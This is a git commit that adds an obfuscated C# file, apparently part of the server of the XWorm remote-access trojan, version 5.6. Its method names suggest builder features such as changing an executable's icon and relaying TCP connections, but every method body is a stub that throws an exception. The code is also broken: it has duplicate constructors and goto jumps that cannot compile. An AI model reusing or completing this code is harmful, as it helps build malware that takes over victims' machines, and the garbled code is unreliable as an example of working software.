743903890c94f76f4416b454dfad91b8cc0b470e
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:35 +0400

    Forms3.cs

---
+++ XWorm V5.6/Server/Forms/Forms3.cs
@@ -0,0 +1,107 @@
+﻿using System;
+using System.Net.Sockets;
+using System.Runtime.CompilerServices;
+using System.Windows.Forms;
+
+namespace D7018A47F4B70814F7CC4EC07E909CEC
+{
+  public class AE8C063EDF77AC603F8ED10C6ADACFB7
+  {
+    public int \u0024State;
+    public AsyncVoidMethodBuilder \u0024Builder;
+    internal IAsyncResult \u0024VB\u0024Local_ar;
+    internal FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024Me;
+    internal int \u0024VB\u0024ResumableLocal_Received\u00240;
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static string MAB0A8E90D95EECMD0EFM7CF0FMDAM77(string path)
+    {
+      try
+      {
+        try
+        {
+        }
+        finally
+        {label_3:
+          goto label_4;
+        }
+        goto label_3;
+      }
+      catch (Exception ex)
+      {label_4:
+        throw new Exception("さ");
+      }
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void M9E7FD9855A56D78A65C274E452735MA(Form o, int interval = 80) => throw new Exception("ゅ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void M859BD14C99CCDBM1BC42ADD211ME6CC(Form o, int interval = 80) => throw new Exception("す");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public AE8C063EDF77AC603F8ED10C6ADACFB7() => throw new Exception("ぇ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void MMF82M11B1MAA4EA417EABEF56E3D54B(string exeFileName, string iconFileName) => throw new Exception("え");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void ME1M796C6ADCBADM94FF62EE26FE234E(
+      string exeFileName,
+      string iconFileName,
+      uint iconGroupID,
+      uint iconBaseID)
+    {
+      throw new Exception("か");
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public AE8C063EDF77AC603F8ED10C6ADACFB7() => throw new Exception("え");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void M68ACCA7D11BEABD61A45CD9DD1EB974(ListView listView) => throw new Exception("ボ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public AE8C063EDF77AC603F8ED10C6ADACFB7() => throw new Exception("で");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    protected virtual void OnNotifyMessage(Message m) => throw new Exception("ョ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void EC62CEB749A914426B566A826A60B780(object sender, ColumnClickEventArgs e) => throw new Exception("ぇ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public AE8C063EDF77AC603F8ED10C6ADACFB7() => throw new Exception("ぴ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void M0F6AB6F06A2M16BECM8B50A6DM2898F(TcpClient tcpClient_2, TcpClient tcpClient_3) => throw new Exception("あ");
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public static void M273CADD2C0F3MFFE90AMAD902E74305()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("㍐");
+      }
+      goto label_2;
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    private void MF0M2M8DF5B62EMEMF6A196M1B50638M()
+    {
+      try
+      {
+      }
+      catch (Exception ex)
+      {
+label_2:
+        throw new Exception("ぇ");
+      }
+      goto label_2;
+    }
+  }
+}
